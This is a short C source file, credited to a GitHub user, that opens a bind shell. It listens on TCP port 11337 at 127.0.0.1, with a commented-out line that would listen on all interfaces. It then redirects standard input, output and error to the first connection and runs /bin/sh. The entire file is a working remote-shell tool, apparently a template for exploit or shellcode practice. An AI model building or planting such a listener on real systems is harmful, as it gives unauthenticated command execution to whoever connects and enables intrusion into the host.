/* 
 * Spawn a bind shell
 * github: A1phaZer0
 */
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 11337

int main(int argc, char *argv[])
{
    int sockfd, new_sockfd;
    struct sockaddr_in host;

    host.sin_family = AF_INET;
    host.sin_port = htons(PORT);
    // host.sin_addr.s_addr = 0;
    inet_aton("127.0.0.1", &(host.sin_addr));

    /* create a socket */
    sockfd = socket(PF_INET, SOCK_STREAM, 0);

    /* bind socket to PORT */
    bind(sockfd, (struct sockaddr *)&host, sizeof(struct sockaddr));

    /* listen to PORT */
    listen(sockfd, 1);

    /* accept new connection */
    new_sockfd = accept(sockfd, NULL, NULL);

    /* let stdin/stdout/seterr point to socket */
    dup2(new_sockfd, 0);
    dup2(new_sockfd, 1);
    dup2(new_sockfd, 2);

    /* get a shell */
    execve("/bin/sh", NULL, NULL);

    return 0;
}